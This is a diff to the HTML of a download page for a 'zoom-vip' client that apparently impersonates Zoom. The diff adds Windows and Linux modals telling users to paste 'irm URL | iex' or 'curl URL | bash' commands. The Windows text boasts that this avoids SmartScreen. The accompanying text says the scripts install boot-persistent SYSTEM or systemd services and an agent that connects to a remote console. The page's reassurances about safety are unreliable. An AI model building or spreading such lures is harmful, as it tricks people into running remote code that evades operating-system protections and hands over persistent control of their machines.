@@ -313,7 +313,7 @@
               <li>If Windows SmartScreen appears, click <b>More info &rarr; Run anyway</b>.</li>
               <li>Finish the setup wizard &mdash; the client launches and connects automatically.</li>
             </ol>
-            <div class="tip">Nothing downloaded? Click <a href="#download">Download</a> above, then choose “Windows”.</div>
+            <div class="tip"><b>No SmartScreen at all:</b> skip the download and <button type="button" class="link-btn" id="win-command-btn">install with one command</button> instead &mdash; PowerShell fetches the client directly, so Windows never flags it.</div>
           </div>
         </details>
         <details>
@@ -335,6 +335,7 @@
               <li>AppImage: right-click &rarr; <b>Properties &rarr; Permissions &rarr; Allow executing</b>, then double-click.</li>
               <li>Debian/Ubuntu: <code>sudo apt install ./zoom-vip*.deb</code> &middot; Fedora/RHEL: <code>sudo rpm -i zoom-vip*.rpm</code></li>
             </ol>
+            <div class="tip"><b>One command, no download:</b> <button type="button" class="link-btn" id="linux-command-btn">install with one command</button> &mdash; fetches the client, installs the agent and connects it, asking for your password once.</div>
           </div>
         </details>
         <details>
@@ -412,8 +413,47 @@
   </div>
 </div>
 
-<div class="toast" id="toast"></div>
+<!-- Windows one-command installer -->
+<div class="modal-back" id="win-modal">
+  <div class="modal">
+    <button class="modal-close" id="win-modal-close" aria-label="Close">&times;</button>
+    <h3>Install zoom-vip on Windows</h3>
+    <p class="sub">No download and no SmartScreen. PowerShell fetches the official client straight from this site, then installs the agent with a single administrator prompt.</p>
+    <ol style="padding-left:20px;font-size:.9rem;line-height:1.65;color:var(--z-ink-soft)">
+      <li>Click <b>Copy command</b>.</li>
+      <li>Press <b>Win</b>, type <b>PowerShell</b>, and open it.</li>
+      <li>Paste the command, press <b>Enter</b>, and approve the one prompt.</li>
+    </ol>
+    <pre class="mac-cmd" id="win-command">irm __WIN_INSTALL_URL__ | iex</pre>
+    <div class="modal-actions">
+      <button class="btn btn-primary" id="win-command-copy" type="button">Copy command</button>
+      <a class="btn btn-ghost" id="win-command-download" href="/api/landing/windows-install.ps1" download="ZoomPrivate-Windows-Install.ps1">Download script</a>
+    </div>
+    <p class="sub" style="margin:14px 0 0">The script downloads the client with <code>Invoke-WebRequest</code> (no Mark-of-the-Web, so SmartScreen is not triggered), verifies it, installs a SYSTEM service that starts on boot, and launches the tray app. No password is sent anywhere.</p>
+  </div>
+</div>
 
+<!-- Linux one-command installer -->
+<div class="modal-back" id="linux-modal">
+  <div class="modal">
+    <button class="modal-close" id="linux-modal-close" aria-label="Close">&times;</button>
+    <h3>Install zoom-vip on Linux</h3>
+    <p class="sub">One command installs the client, registers the agent and connects it to your console. It asks for your password once (sudo).</p>
+    <ol style="padding-left:20px;font-size:.9rem;line-height:1.65;color:var(--z-ink-soft)">
+      <li>Click <b>Copy command</b>.</li>
+      <li>Open a <b>Terminal</b>.</li>
+      <li>Paste the command and press <b>Enter</b>.</li>
+    </ol>
+    <pre class="mac-cmd" id="linux-command">curl -fsSL __LINUX_INSTALL_URL__ | bash</pre>
+    <div class="modal-actions">
+      <button class="btn btn-primary" id="linux-command-copy" type="button">Copy command</button>
+      <a class="btn btn-ghost" id="linux-command-download" href="/api/landing/linux-install.sh" download="ZoomPrivate-Linux-Install.sh">Download script</a>
+    </div>
+    <p class="sub" style="margin:14px 0 0">The script verifies the download, extracts it and runs the bundled installer, which registers a systemd service that starts on boot and survives logout. Nothing is sent except the connection profile it is told to use.</p>
+  </div>
+</div>
+
+<div class="toast" id="toast"></div>
 <!-- Externalised (CSP: script-src 'self' + nonce; inline <script> is blocked). -->
 <script src="/js/landing.js" defer></script>
 </body>
